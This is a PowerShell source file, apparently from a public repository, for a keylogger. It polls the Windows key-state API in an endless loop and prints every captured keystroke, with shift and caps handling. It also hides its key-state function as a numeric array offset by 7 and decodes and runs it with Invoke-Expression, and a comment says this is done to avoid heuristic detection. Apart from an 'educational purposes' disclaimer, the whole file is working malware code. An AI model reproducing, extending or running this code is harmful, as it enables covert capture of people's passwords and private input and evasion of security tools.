<#
Powershell_Keylogger https://github.com/Androsh7/Powershell_Keylogger
Written By Androsh7

MIT License

Copyright (c) 2024 Androsh7

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.

THIS TOOL IS FOR EDUCATIONAL AND RESEARCH PURPOSES ONLY
MALICIOUS USE OF THIS TOOL MAY CONSTITUTE A CRIME
#>

$Signature = @'
    [DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
    public static extern short GetAsyncKeyState(int virtualKeyCode); 
'@

Add-Type -MemberDefinition $Signature -Name Keyboard -Namespace PsOneApi
Add-Type -AssemblyName System.Windows.Forms

# ignore UNK characters
$ignore_non_printable = $true

$letter_dict = @{
	#1 = @("LMB", "LMB")
	#2 = @("RMB", "RMB")
	#4 = @("MMB", "MMB")
	#6 = @("HOME", "HOME") # Home
	8 = @("`b", "`b") # Backspace
	9 = @("`t", "`t") # Tab
	13 = @("`n", "`n") # Enter
	#20 = @("CAPS", "CAPS")
	#27 = @("ESC", "ESC")
	32 = @(" ", " ")
	#33 = @("PAGE_UP", "PAGE_UP")
	#34 = @("PAGE_DOWN", "PAGE_DOWN")
	#91 = @("WIN", "WIN")
	#160 = @("LSHIFT", "LSHIFT")
	#161 = @("RSHIFT", "RSHIFT")
	#162 = @("LCTRL", "LCTRL")
	#163 = @("RCTRL", "RCTRL")
	#164 = @("LALT", "LALT")
	186 = @(";", ":")
	187 = @("=", "+")
	188 = @(",", "<")
	189 = @("-", "_")
	190 = @(".", ">")
	191 = @("/", "?")
	192 = @("``", "~")
	219 = @("[", "{")
	220 = @("\", "|")
	221 = @("]", "}")
	222 = @("'", '"')
}
$num_dict = @{
	48 = @("0", ")")
	49 = @("1", "!")
	50 = @("2", "@")
	51 = @("3", "#")
	52 = @("4", "$")
	53 = @("5", "%")
	54 = @("6", "^")
	55 = @("7", "&")
	56 = @("8", "*")
	57 = @("9", "(")
}
if ($ignore_non_printable) {
	$key_list = $letter_dict.Keys
	$key_list += $num_dict.Keys
	$key_list += 65..90 # A-Z
} else {
	$key_list = 1..255
}

# Defines the key state function
# Function defined as a binary array (offset by 7) to avoid heuristic detection
$KeyStateFunction = ""
(109, 124, 117, 106, 123, 112, 118, 117, 39, 78, 108, 123, 82, 108, 128, 90, 123, 104, 123, 108, 39, 47, 43, 114, 108, 128, 51, 39, 43, 116, 104, 122, 114, 39, 68, 39, 55, 127, 62, 77, 77, 77, 48, 39, 130, 39, 121, 108, 123, 124, 121, 117, 39, 98, 105, 118, 118, 115, 100, 47, 47, 98, 87, 122, 86, 117, 108, 72, 119, 112, 53, 82, 108, 128, 105, 118, 104, 121, 107, 100, 65, 65, 78, 108, 123, 72, 122, 128, 117, 106, 82, 108, 128, 90, 123, 104, 123, 108, 47, 98, 105, 128, 123, 108, 100, 43, 114, 108, 128, 48, 48, 39, 52, 105, 104, 117, 107, 39, 43, 116, 104, 122, 114, 48, 39, 132) | ForEach-Object {
	$KeyStateFunction += [char]($_ - 7)
}
Invoke-Expression $KeyStateFunction

while($true) {

	# check if shift and caps lock are pressed
	$SHIFT = GetKeyState -key 16 -mask 0x8000
	$CAPS = [System.Windows.Forms.Control]::IsKeyLocked('CapsLock')
	
	# determines whether to shift the characters
	$CHAR_SHIFT = $SHIFT -xor $CAPS

	foreach ($keynum in $key_list) {
		if (GetKeyState($keynum)) {

			# printing for A-Za-z ASCII characters
			if ($keynum -in 65..90) {
				if ($CHAR_SHIFT) { $outkey = [char]$keynum } 
				else { $outkey = [char]($keynum + 32) }
			}

			# printing for 0-9 ASCII characters
			elseif ($keynum -in $num_dict.Keys) {
				$outkey = $num_dict.Item($keynum)[$SHIFT]
			}

			# printing for other characters
			else {
				try {
					$outkey = $letter_dict.Item($keynum)[$CHAR_SHIFT]
				}
				catch {
					if ($ignore_non_printable) { $outkey = $false } 
					else { $outkey = ":UNK-${keynum}:" }
				}
			}

			# print the key
			if ($outkey) { Write-Host -NoNewLine $outkey }
			$outkey = $false
		}
	}
}